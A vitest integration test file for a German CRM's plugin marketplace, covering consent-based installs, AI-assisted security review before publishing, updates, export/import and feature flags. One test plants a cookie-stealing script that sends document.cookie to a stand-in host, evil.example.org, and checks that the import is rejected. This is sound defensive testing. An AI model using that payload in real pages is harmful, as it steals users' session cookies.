import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { berlinDay, startTestApp } from './helpers.js';
import { client, type Call } from './security-fixtures.js';
import { pluginAnswer, usage } from './werkstatt-fakes.js';
import { EXAMPLES } from '../server/services/werkstatt/examples.js';
import { bucket, decide } from '../server/services/flags.js';

let t: Awaited<ReturnType<typeof startTestApp>>;
let A = '';
let B = '';
let admin: Call;
let member: Call; // team member in A (no area restriction)
let narrow: Call; // only "contacts" in A
let other: Call; // team member in B
const allOk = (ok = true) => ['scopes-minimal', 'no-exfiltration', 'no-external-resources', 'no-dangerous-apis', 'data-handling', 'writes-justified', 'ai-injection', 'matches-description', 'robustness'].map((id) => ({ id, ok, note: 'Geprüft.' }));
let review: (input: any) => any = () => ({ verdict: 'pass', summary: 'Unbedenklich.', checks: allOk() });
let build: (input: any) => any = () => pluginAnswer('deal-ampel');

const login = async (email: string, loc: string) => {
  const c = client(t.base, { 'x-pghl': '1', 'x-location-id': loc });
  expect((await c('POST', '/api/auth/login', { email, password: 'passwort-1x' })).status).toBe(200);
  return c;
};
const wait = async () => void (await t.app.services.werkstatt.idle());
const scopesOf = (p: any) => p.scopes.map((s: any) => s.key);
const install = (c: Call, key: string) => c('POST', `/api/plugins/examples/${key}/install`, { consent: EXAMPLES[key].manifest.scopes });
const consentFor = async (c: Call, id: string) => scopesOf((await c('GET', `/api/marktplatz/${id}`)).data);

/** Reviews and publishes a plugin as an admin (mocked AI). */
const publish = async (id: string, versionId?: string) => {
  const r = await admin('POST', `/api/marktplatz/${id}/security-review`, versionId ? { version_id: versionId } : {});
  expect(r.status, JSON.stringify(r.data)).toBe(200);
  const p = await admin('POST', `/api/marktplatz/${id}/publish`, { review_id: r.data.id, approve: true, accept_warnings: true });
  expect(p.status, JSON.stringify(p.data)).toBe(200);
  return p.data;
};

beforeAll(async () => {
  t = await startTestApp();
  await t.setup();
  A = t.api.location;
  B = (await t.api.post('/api/locations', { name: 'Zweitfirma' })).data.id;
  admin = client(t.base, { 'x-pghl': '1', 'x-location-id': A });
  expect((await admin('POST', '/api/auth/login', { email: 'chef@example.com', password: 'geheim123' })).status).toBe(200);
  for (const [email, locs, perms] of [['m1@example.com', [A], null], ['m2@example.com', [A], ['contacts']], ['n1@example.com', [B], null]] as const)
    expect((await admin('POST', '/api/users', { email, name: email.split('@')[0], password: 'passwort-1x', role: 'member', locations: locs, permissions: perms })).status).toBe(200);
  member = await login('m1@example.com', A);
  narrow = await login('m2@example.com', A);
  other = await login('n1@example.com', B);
  expect((await admin('PUT', '/api/werkstatt/policy', { who: 'everyone', approval: false, budget_usd: 50 })).status).toBe(200);
  // The Werkstatt only works with a top model (model gate): the assistant runs Claude Opus 5.5 here.
  for (const loc of [A, B]) expect((await admin('PUT', '/api/ai/settings', { model: 'claude-opus-5-5' }, { 'x-location-id': loc })).status).toBe(200);
  t.app.services.aiReady = () => null;
  t.app.services.aiRun = async (input: any) => {
    const body = input.purpose === 'werkstatt_review' ? review(input) : input.purpose === 'werkstatt_spec' ? { title: 'Deal-Ampel im Kern', spec_markdown: '## Ziel\nDie Ampel gehört ins Dashboard.' } : build(input);
    return input.purpose === 'plugin' ? { text: 'Zusammenfassung', model: 'x', usage } : { text: JSON.stringify(body), model: 'claude-opus-5-5', stopReason: 'end_turn', usage, ms: 5 };
  };
}, 60_000);
afterAll(() => t.close());

describe('install scopes: privat → Sub-Account → Agentur-weit', () => {
  let id = '';
  it('an example plugin starts private for the person who set it up', async () => {
    expect((await member('POST', '/api/plugins/examples/deal-ampel/install', {})).status).toBe(400); // no consent
    const r = await install(member, 'deal-ampel');
    expect(r.status, JSON.stringify(r.data)).toBe(200);
    id = r.data.id;
    expect(r.data).toMatchObject({ scope: 'private', active_here: true, origin: 'example' });
    expect((await narrow('GET', '/api/plugins/active')).data).toEqual([]);
    expect((await other('GET', '/api/plugins/active')).data).toEqual([]);
    // examples are listed with their requested permissions
    const ex = (await member('GET', '/api/plugins/examples')).data;
    expect(ex.map((e: any) => e.key)).toEqual(expect.arrayContaining(['geburtstags-erinnerungen', 'deal-ampel', 'notizen-zusammenfassung', 'followup-aufgabe']));
    expect(ex.find((e: any) => e.key === 'deal-ampel').installed).toBe(id);
  });

  it('a team member shares it with the sub-account; a restricted login may not; the other sub-account still sees nothing', async () => {
    expect((await narrow('POST', `/api/plugins/${id}/scope`, { scope: 'location' })).status).toBe(404);
    const r = await member('POST', `/api/plugins/${id}/scope`, { scope: 'location' });
    expect(r.status).toBe(200);
    expect(r.data.scope).toBe('location');
    expect((await narrow('GET', '/api/plugins/active')).data.map((p: any) => p.id)).toContain(id);
    expect((await other('GET', '/api/plugins/active')).data).toEqual([]);
    // a plain user of the sub-account can switch it off only with the team right
    expect((await narrow('POST', `/api/plugins/${id}/toggle`, { enabled: false })).status).toBe(403);
    expect((await member('POST', `/api/plugins/${id}/scope`, { scope: 'private' })).data.scope).toBe('private');
    expect((await narrow('GET', '/api/plugins/active')).data).toEqual([]);
    expect((await member('POST', `/api/plugins/${id}/scope`, { scope: 'location' })).data.scope).toBe('location');
  });

  it('agency-wide is for admins; then every sub-account has it, and can switch it off for itself', async () => {
    expect((await member('POST', `/api/plugins/${id}/scope`, { scope: 'agency' })).status).toBe(403);
    expect((await admin('POST', `/api/plugins/${id}/scope`, { scope: 'agency' })).data.scope).toBe('agency');
    expect((await other('GET', '/api/plugins/active')).data.map((p: any) => p.id)).toContain(id);
    expect((await other('POST', `/api/plugins/${id}/call`, { op: 'opportunities.list', args: {} })).status).toBe(200);
    const off = await other('POST', `/api/plugins/${id}/toggle`, { enabled: false });
    expect(off.status).toBe(200);
    expect((await other('GET', '/api/plugins/active')).data).toEqual([]);
    expect((await member('GET', '/api/plugins/active')).data.map((p: any) => p.id)).toContain(id);
    // an admin sees every plugin with its health; a member does not get the overview
    const all = (await admin('GET', '/api/marktplatz/admin/plugins')).data.plugins;
    expect(all.find((p: any) => p.id === id).health).toMatchObject({ installs: expect.any(Number) });
    expect((await member('GET', '/api/marktplatz/admin/plugins')).status).toBe(403);
    await admin('POST', `/api/plugins/${id}/scope`, { scope: 'private' });
  });
});

describe('Marktplatz: curation, install with consent, updates, reviews, uninstall', () => {
  let id = '';
  beforeAll(async () => {
    id = (await install(member, 'notizen-zusammenfassung')).data.id;
  });

  it('only admins publish, and only after a security review that did not fail', async () => {
    expect((await member('POST', `/api/marktplatz/${id}/security-review`, {})).status).toBe(403);
    expect((await member('POST', `/api/marktplatz/${id}/publish`, {})).status).toBe(403);
    // publishing without a review is refused
    const none = await admin('POST', `/api/marktplatz/${id}/publish`, { approve: true });
    expect(none.status).toBe(409);
    expect(none.data.error).toContain('Sicherheitsprüfung');
    // a failing review blocks publishing
    review = () => ({ verdict: 'fail', summary: 'Sendet Daten nach außen.', checks: [{ id: 'no-exfiltration', ok: false, note: 'Verdächtig.' }] });
    const f = await admin('POST', `/api/marktplatz/${id}/security-review`, {});
    expect(f.status).toBe(200);
    expect(f.data.verdict).toBe('fail');
    expect(f.data.checks).toHaveLength(9);
    const blocked = await admin('POST', `/api/marktplatz/${id}/publish`, { review_id: f.data.id, approve: true });
    expect(blocked.status).toBe(409);
    // a pass still needs the admin's own approval
    review = () => ({ verdict: 'warn', summary: 'Mit Hinweisen.', checks: allOk() });
    const warn = await admin('POST', `/api/marktplatz/${id}/security-review`, {});
    expect(warn.data.verdict).toBe('warn');
    expect((await admin('POST', `/api/marktplatz/${id}/publish`, { review_id: warn.data.id, approve: true })).status).toBe(400); // warnings must be acknowledged
    review = () => ({ verdict: 'pass', summary: 'Unbedenklich.', checks: allOk() });
    const ok = await admin('POST', `/api/marktplatz/${id}/security-review`, {});
    expect(ok.data.verdict).toBe('pass');
    expect((await admin('POST', `/api/marktplatz/${id}/publish`, { review_id: ok.data.id })).status).toBe(400); // the admin's own approval is explicit
    const pub = await admin('POST', `/api/marktplatz/${id}/publish`, { review_id: ok.data.id, approve: true });
    expect(pub.status).toBe(200);
    expect(pub.data.version).toBe('1.0.0');
  });

  it('the review is a program check plus the AI: a plugin that fails the static checks is refused whatever the AI says', async () => {
    const bad = (await install(member, 'deal-ampel')).data.id;
    // tamper with the stored code (as if edited outside the Werkstatt)
    t.app.db.run(`UPDATE plugin_versions SET ui_html = '<p>padding padding padding</p><script>fetch("/x")</script>' WHERE plugin_id = ?`, bad);
    const r2 = await admin('POST', `/api/marktplatz/${bad}/security-review`, {});
    expect(r2.status, JSON.stringify(r2.data)).toBe(200);
    expect(r2.data.verdict).toBe('fail'); // the stored version still says "checked", the review looks again
    expect(r2.data.checks.find((c: any) => c.id === 'no-dangerous-apis')).toMatchObject({ ok: false, source: 'auto' });
    expect((await admin('POST', `/api/marktplatz/${bad}/publish`, { review_id: r2.data.id, approve: true })).status).toBe(409);
  });

  it('lists published plugins with category, search, rating and install counts', async () => {
    const list = (await other('GET', '/api/marktplatz')).data;
    expect(list.plugins.map((p: any) => p.id)).toContain(id);
    expect(list.categories.find((c: any) => c.key === 'ki').count).toBe(1);
    const p = list.plugins.find((x: any) => x.id === id);
    expect(p).toMatchObject({ name: 'Kontakt-Notizen-Zusammenfassung', category_label: 'KI & Zusammenfassungen', installed: false, installs: 1, rating: null });
    expect(p.owner).toBeUndefined(); // like the wish list: names only for the agency
    expect((await other('GET', '/api/marktplatz?q=zusammen')).data.plugins).toHaveLength(1);
    expect((await other('GET', '/api/marktplatz?q=zzzz')).data.plugins).toHaveLength(0);
    expect((await other('GET', '/api/marktplatz?category=vertrieb')).data.plugins).toHaveLength(0);
    expect((await admin('GET', '/api/marktplatz')).data.plugins[0].owner).toBeDefined();
  });

  it('install needs the consent to exactly the requested permissions, and the team right for the whole sub-account', async () => {
    const scopes = await consentFor(other, id);
    expect([...scopes].sort()).toEqual(['ai:run', 'contacts:read']);
    expect((await other('POST', `/api/marktplatz/${id}/install`, { consent: [] })).status).toBe(400);
    expect((await other('POST', `/api/marktplatz/${id}/install`, { consent: ['contacts:read'] })).status).toBe(400);
    expect((await other('POST', `/api/marktplatz/${id}/install`, { consent: [...scopes, 'contacts:write'] })).status).toBe(400);
    const r = await other('POST', `/api/marktplatz/${id}/install`, { consent: scopes });
    expect(r.status, JSON.stringify(r.data)).toBe(200);
    expect(r.data).toMatchObject({ installed: true, installed_scope: 'location', installs: 2 });
    expect((await other('GET', '/api/plugins/active')).data.map((p: any) => p.id)).toContain(id);
  });

  it('a person without the team right can only install for themselves', async () => {
    // the owner's own sub-account install does not count for the person under test
    t.app.db.run(`DELETE FROM plugin_installs WHERE plugin_id = ? AND location_id = ?`, id, A);
    const scopes = await consentFor(narrow, id);
    expect((await narrow('POST', `/api/marktplatz/${id}/install`, { consent: scopes, scope: 'location' })).status).toBe(403);
    const mine = await narrow('POST', `/api/marktplatz/${id}/install`, { consent: scopes, scope: 'private' });
    expect(mine.status).toBe(200);
    expect(mine.data.installed_scope).toBe('private');
    expect((await member('GET', '/api/plugins/active')).data.map((p: any) => p.id)).not.toContain(id);
  });

  it('ratings come only from people who installed it; one per person; names stay hidden from non-admins', async () => {
    expect((await member('PUT', `/api/marktplatz/${id}/reviews`, { rating: 5 })).status).toBe(403);
    expect((await other('PUT', `/api/marktplatz/${id}/reviews`, { rating: 9 })).status).toBe(400);
    expect((await other('PUT', `/api/marktplatz/${id}/reviews`, { rating: 5, body: 'Super nützlich' })).status).toBe(200);
    expect((await narrow('PUT', `/api/marktplatz/${id}/reviews`, { rating: 3, body: 'Geht so' })).status).toBe(200);
    expect((await other('PUT', `/api/marktplatz/${id}/reviews`, { rating: 4, body: 'Super nützlich, mit kleinen Macken' })).status).toBe(200);
    const detail = (await other('GET', `/api/marktplatz/${id}`)).data;
    expect(detail).toMatchObject({ rating: 3.5, reviews: 2, my_review: { rating: 4 } });
    const list = (await other('GET', `/api/marktplatz/${id}/reviews`)).data;
    expect(list.map((r: any) => r.author).sort()).toEqual(['', 'Du']);
    expect((await admin('GET', `/api/marktplatz/${id}/reviews`)).data.every((r: any) => r.author.includes('('))).toBe(true);
  });

  it('a new published version shows as an update with its changelog; new permissions need a new consent', async () => {
    // the author changes the plugin: a new version that asks for one more permission
    build = () => {
      const a = pluginAnswer('notizen-zusammenfassung');
      a.manifest.scopes = ['contacts:read', 'ai:run', 'tasks:read'];
      a.ui_html = a.ui_html.replace('var id = ctx.entity && ctx.entity.id;', 'var id = ctx.entity && ctx.entity.id; gohigh.tasks.list({});');
      a.changelog = 'Zeigt zusätzlich offene Aufgaben.';
      return a;
    };
    const c = await member('POST', `/api/werkstatt/plugins/${id}/change`, { feedback: 'Zeig bitte auch offene Aufgaben an.' });
    expect(c.status, JSON.stringify(c.data)).toBe(200);
    await wait();
    const b = (await member('GET', `/api/werkstatt/builds/${c.data.id}`)).data;
    expect(b.status, b.error).toBe('done');
    const detail = (await member('GET', `/api/plugins/${id}`)).data;
    expect(detail.versions.map((v: any) => v.version)).toEqual(['1.0.1', '1.0.0']);
    // new permissions: the plugin keeps running the old version until it is activated with a consent
    expect(detail.versions[0]).toMatchObject({ active: false, status: 'checked' });
    expect((await admin('POST', `/api/plugins/${id}/versions/${detail.versions[0].id}/activate`, {})).status).toBe(400); // no consent
    // more permissions for a shared plugin: only an admin confirms them
    expect((await member('POST', `/api/plugins/${id}/versions/${detail.versions[0].id}/activate`, { consent: ['contacts:read', 'ai:run', 'tasks:read'] })).status).toBe(400);
    const act = await admin('POST', `/api/plugins/${id}/versions/${detail.versions[0].id}/activate`, { consent: ['contacts:read', 'ai:run', 'tasks:read'] });
    expect(act.status, JSON.stringify(act.data)).toBe(200);
    expect(act.data.new_scopes).toEqual(['tasks:read']);
    // not yet in the Marktplatz: installs stay on 1.0.0
    expect((await other('GET', `/api/marktplatz/${id}`)).data).toMatchObject({ version: '1.0.0', update: null });
    await publish(id, detail.versions[0].id);
    const upd = (await other('GET', `/api/marktplatz/${id}`)).data;
    expect(upd.version).toBe('1.0.1');
    expect(upd.update).toMatchObject({ from: '1.0.0', to: '1.0.1', new_scopes: [{ key: 'tasks:read' }] });
    expect(upd.update.changelog[0].changelog).toContain('offene Aufgaben');
    expect((await other('GET', '/api/marktplatz')).data.plugins.find((p: any) => p.id === id).update_available).toBe(true);
    // the old version keeps working until they update – and updating with new permissions asks again
    expect((await other('POST', `/api/plugins/${id}/call`, { op: 'tasks.list', args: {} })).status).toBe(403);
    expect((await other('POST', `/api/marktplatz/${id}/update`, {})).status).toBe(400);
    const done = await other('POST', `/api/marktplatz/${id}/update`, { consent: ['contacts:read', 'ai:run', 'tasks:read'] });
    expect(done.status, JSON.stringify(done.data)).toBe(200);
    expect(done.data.update_available).toBe(false);
    expect((await other('POST', `/api/plugins/${id}/call`, { op: 'tasks.list', args: {} })).status).toBe(200);
    // and the author can roll back to the first version
    const first = detail.versions[1];
    expect((await member('POST', `/api/plugins/${id}/versions/${first.id}/activate`, {})).status).toBe(200);
    expect((await member('GET', `/api/plugins/${id}`)).data.version).toBe('1.0.0');
  });

  it('uninstall removes the install; with cleanup also what the plugin stored', async () => {
    await other('POST', `/api/plugins/${id}/call`, { op: 'storage.set', args: { key: 'k', value: 1 } });
    expect(t.app.db.all('SELECT 1 FROM plugin_storage WHERE plugin_id = ? AND location_id = ?', id, B)).toHaveLength(1);
    expect((await other('POST', `/api/plugins/${id}/uninstall`, { cleanup: true })).status).toBe(200);
    expect((await other('GET', '/api/plugins/active')).data.map((p: any) => p.id)).not.toContain(id);
    expect(t.app.db.all('SELECT 1 FROM plugin_storage WHERE plugin_id = ? AND location_id = ?', id, B)).toHaveLength(0);
    // still listed in the Marktplatz, installable again
    expect((await other('GET', `/api/marktplatz/${id}`)).data.installed).toBe(false);
  });

  it('the bridge records what a plugin created, so uninstalling can take it away again', async () => {
    const fid = (await install(member, 'followup-aufgabe')).data.id;
    // a task through the bridge needs tasks:write: the follow-up plugin has it
    const call = await member('POST', `/api/plugins/${fid}/call`, { op: 'tasks.create', args: { title: 'Vom Plugin' } });
    expect(call.status, JSON.stringify(call.data)).toBe(200);
    const taskId = call.data.data.id;
    expect((await member('GET', '/api/tasks')).data.map((x: any) => x.id)).toContain(taskId);
    const un = await member('POST', `/api/plugins/${fid}/uninstall`, { cleanup: true });
    expect(un.data).toMatchObject({ ok: true, removed: 1, failed: 0 });
    expect((await member('GET', '/api/tasks')).data.map((x: any) => x.id)).not.toContain(taskId);
  });
});

describe('server logic: scheduled jobs and the workflow action „Plugin-Aktion“', () => {
  it('runs the birthday job in the sandbox as the person who installed it', async () => {
    const id = (await install(member, 'geburtstags-erinnerungen')).data.id;
    await member('POST', `/api/plugins/${id}/scope`, { scope: 'location' });
    const today = berlinDay(); // the job's "today" is the sub-account's (Berlin), not the UTC date
    const c = (await member('POST', '/api/contacts', { first_name: 'Anna', last_name: 'Geburtstag', email: 'anna@kunde.example', date_of_birth: `1990-${today.slice(5)}` })).data;
    const tick = t.app.services.pluginJobsTick as (at?: Date) => Promise<number>;
    expect(await tick(new Date())).toBe(0); // the first tick only schedules
    const st = t.app.db.get<{ next_run_at: string }>('SELECT next_run_at FROM plugin_job_state WHERE plugin_id = ?', id)!;
    expect(new Date(st.next_run_at).getTime()).toBeGreaterThan(Date.now());
    expect(await tick(new Date(Date.parse(st.next_run_at) + 1000))).toBe(1);
    const tasks = (await member('GET', '/api/tasks')).data.filter((x: any) => x.contact_id === c.id);
    expect(tasks).toHaveLength(1);
    expect(tasks[0].title).toContain('Anna Geburtstag');
    const run = t.app.db.get<any>('SELECT * FROM plugin_runs WHERE plugin_id = ? ORDER BY created_at DESC', id)!;
    expect(run).toMatchObject({ kind: 'job', entry_id: 'daily', status: 'ok' });
    // a second run the same day creates nothing new
    t.app.db.run('UPDATE plugin_job_state SET next_run_at = ? WHERE plugin_id = ?', new Date(Date.now() - 1000).toISOString(), id);
    await tick(new Date());
    expect((await member('GET', '/api/tasks')).data.filter((x: any) => x.contact_id === c.id)).toHaveLength(1);
    // the audit log shows who acted for whom
    const audit = JSON.stringify((await admin('GET', '/api/audit?limit=80')).data);
    expect(audit).toContain('Plugin Geburtstags-Erinnerungen (im Auftrag von');
    // the policy can switch server logic off
    await admin('PUT', '/api/werkstatt/policy', { server_logic: 'off' });
    t.app.db.run('UPDATE plugin_job_state SET next_run_at = ? WHERE plugin_id = ?', new Date(Date.now() - 1000).toISOString(), id);
    await tick(new Date());
    expect(t.app.db.get<any>('SELECT status, detail FROM plugin_runs WHERE plugin_id = ? ORDER BY created_at DESC', id)).toMatchObject({ status: 'error', detail: expect.stringContaining('ausgeschaltet') });
    await admin('PUT', '/api/werkstatt/policy', { server_logic: 'script' });
  });

  it('a declarative plugin runs as a step in an automation and creates a task for the contact', async () => {
    const id = (await install(member, 'followup-aufgabe')).data.id;
    const wf = (await member('POST', '/api/workflows', { name: 'Mit Plugin', trigger: { type: 'contact.tag_added', config: { tag: 'plugin-test' } }, steps: [{ type: 'plugin_action', plugin: id, action: 'followup', input: { title: 'Nachfassen' } }] })).data;
    expect((await member('GET', '/api/workflows/meta')).data.steps).toContain('plugin_action');
    await member('PATCH', `/api/workflows/${wf.id}`, { status: 'active' });
    // private plugins never run inside automations
    const c = (await member('POST', '/api/contacts', { first_name: 'Paula', email: 'paula@kunde.example', tags: ['plugin-test'] })).data;
    await t.app.events.flush();
    let runs = (await member('GET', `/api/workflows/${wf.id}/runs`)).data.runs;
    expect(JSON.stringify(runs[0].log)).toContain('nicht für alle aktiv');
    expect((await member('GET', '/api/tasks')).data.filter((x: any) => x.contact_id === c.id)).toHaveLength(0);
    // shared with the sub-account it works
    await member('POST', `/api/plugins/${id}/scope`, { scope: 'location' });
    const c2 = (await member('POST', '/api/contacts', { first_name: 'Quirin', email: 'quirin@kunde.example', tags: ['plugin-test'] })).data;
    await t.app.events.flush();
    const tasks = (await member('GET', '/api/tasks')).data.filter((x: any) => x.contact_id === c2.id);
    expect(tasks, JSON.stringify((await member('GET', `/api/workflows/${wf.id}/runs`)).data.runs)).toHaveLength(1);
    expect(tasks[0].title).toBe('Nachfassen – Quirin');
    runs = (await member('GET', `/api/workflows/${wf.id}/runs`)).data.runs;
    expect(JSON.stringify(runs)).toContain('ausgeführt');
    // the editor lists the actions
    expect((await member('GET', '/api/plugins/actions')).data).toEqual(expect.arrayContaining([expect.objectContaining({ plugin: id, action: 'followup', fields: [expect.objectContaining({ key: 'title' })] })]));
  });
});

describe('export and import as a JSON bundle', () => {
  it('exports a plugin and imports it in another sub-account after a consent, running every check again', async () => {
    const id = (await install(member, 'deal-ampel')).data.id;
    const ex = await member('GET', `/api/plugins/${id}/export`);
    expect(ex.status).toBe(200);
    expect(ex.headers.get('content-disposition')).toContain('.gohigh-plugin.json');
    const bundle = JSON.parse(ex.text);
    expect(bundle).toMatchObject({ format: 'gohigh-plugin', bundle_version: 1, plugin: { name: 'Deal-Ampel' } });
    expect(JSON.stringify(bundle)).not.toMatch(/session|password|token/i);
    const pre = await other('POST', '/api/plugins/import/preview', { bundle });
    expect(pre.data).toMatchObject({ name: 'Deal-Ampel', intact: true, consent_required: ['opportunities:read'] });
    expect((await other('POST', '/api/plugins/import', { bundle })).status).toBe(400);
    const r = await other('POST', '/api/plugins/import', { bundle, consent: ['opportunities:read'], accept_unverified: true });
    expect(r.status, JSON.stringify(r.data)).toBe(200);
    expect(r.data, JSON.stringify(r.data)).toMatchObject({ name: 'Deal-Ampel', scope: 'private', origin: 'import', intact: true, active_here: true });
    expect(r.data.slug).not.toBe('deal-ampel'); // slugs stay unique
    expect((await member('GET', '/api/plugins/active')).data.map((p: any) => p.id)).not.toContain(r.data.id);
    // a tampered bundle is checked like any other code
    const evil = JSON.parse(ex.text);
    evil.version.ui_html = '<div>x</div><script>fetch("https://evil.example.org/?d=" + document.cookie)</script>';
    const bad = await other('POST', '/api/plugins/import', { bundle: evil, consent: ['opportunities:read'], accept_unverified: true });
    expect(bad.status).toBe(400);
    expect(bad.data.error).toContain('fetch');
    const edited = JSON.parse(ex.text);
    edited.version.ui_html += '\n<!-- von Hand geändert -->';
    expect((await other('POST', '/api/plugins/import/preview', { bundle: edited })).data.intact).toBe(false);
    expect((await other('POST', '/api/plugins/import', { bundle: { format: 'andere-app' }, consent: [] })).status).toBe(400);
  });
});

describe('feature flags: privat → Sub-Account → Prozent → alle', () => {
  it('decides by stage, and a bigger percentage never takes anybody out', () => {
    const f = { name: 'core.test', stage: 'off' as const, percent: 0, users: ['u1'], locations: ['l1'] };
    expect(decide(f, { locationId: 'l1', userId: 'u1' })).toBe(false);
    expect(decide({ ...f, stage: 'private' }, { userId: 'u1', locationId: 'x' })).toBe(true);
    expect(decide({ ...f, stage: 'private' }, { userId: 'u2', locationId: 'l1' })).toBe(false);
    expect(decide({ ...f, stage: 'location' }, { userId: 'u2', locationId: 'l1' })).toBe(true);
    expect(decide({ ...f, stage: 'location' }, { userId: 'u2', locationId: 'l2' })).toBe(false);
    expect(decide({ ...f, stage: 'all' }, {})).toBe(true);
    const ids = Array.from({ length: 400 }, (_, i) => `loc${i}`);
    const on = (p: number) => ids.filter((l) => decide({ ...f, stage: 'percent', percent: p }, { locationId: l }));
    const p20 = on(20);
    const p50 = on(50);
    expect(p20.length).toBeGreaterThan(40);
    expect(p20.length).toBeLessThan(120);
    expect(p20.every((l) => p50.includes(l))).toBe(true);
    expect(on(0)).toHaveLength(0);
    expect(on(100)).toHaveLength(400);
    expect(bucket('a', 'x')).toBe(bucket('a', 'x'));
  });

  it('the helper and the admin UI routes work', async () => {
    const flags = t.app.services.flags as any;
    expect(flags.enabled('core.neu', { locationId: A })).toBe(false);
    flags.define('core.neu', { description: 'Ein neues Kernfeature' });
    expect(flags.enabled('core.neu', { locationId: A })).toBe(false);
    expect((await member('GET', '/api/flags')).status).toBe(403);
    expect((await admin('PUT', '/api/flags/core.neu', { stage: 'bogus' })).status).toBe(400);
    expect((await admin('PUT', '/api/flags/core.neu', { stage: 'location', locations: [B, 'nope'] })).data.locations).toEqual([B]);
    expect(flags.enabled('core.neu', { locationId: B })).toBe(true);
    expect(flags.enabled('core.neu', { locationId: A })).toBe(false);
    expect((await other('GET', '/api/flags/me')).data['core.neu']).toBe(true);
    expect((await member('GET', '/api/flags/me')).data['core.neu']).toBe(false);
    const me = (await admin('GET', '/api/users')).data.find((u: any) => u.email === 'm1@example.com');
    await admin('PUT', '/api/flags/core.neu', { stage: 'private', users: [me.id] });
    expect((await member('GET', '/api/flags/me')).data['core.neu']).toBe(true);
    expect((await other('GET', '/api/flags/me')).data['core.neu']).toBe(false);
    await admin('PUT', '/api/flags/core.neu', { stage: 'percent', percent: 100 });
    expect((await other('GET', '/api/flags/me')).data['core.neu']).toBe(true);
    await admin('PUT', '/api/flags/core.neu', { stage: 'all' });
    expect(flags.enabled('core.neu', {})).toBe(true);
    expect((await admin('POST', '/api/flags', { name: 'Bad Name' })).status).toBe(400);
    expect((await admin('POST', '/api/flags', { name: 'core.zwei', stage: 'all' })).data.stage).toBe('all');
    expect((await admin('DELETE', '/api/flags/core.zwei')).status).toBe(200);
  });
});
